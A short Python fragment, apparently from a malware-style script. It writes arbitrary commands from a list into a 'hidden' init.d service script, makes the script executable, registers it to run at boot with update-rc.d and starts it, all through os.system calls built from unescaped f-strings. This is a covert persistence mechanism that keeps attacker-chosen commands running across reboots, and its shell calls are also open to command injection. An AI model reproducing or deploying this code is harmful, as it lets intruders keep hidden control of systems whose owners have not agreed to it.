    hidden_service_path = f"/etc/init.d/{system_service}"
    with open(hidden_service_path, "w") as file:
        file.write("#!/bin/bash\n")
        file.write("case $1 in\n")
        file.write("start)\n")
        for command in command_list:
            file.write(f"    {command}\n")
        file.write("    ;;\n")
        file.write("esac\n")
    
    # Make the service executable
    os.system(f"chmod +x {hidden_service_path}")
    
    # Register the service
    os.system(f"update-rc.d {system_service} defaults")
    
    # Start the service
    os.system(f"service {system_service} start")
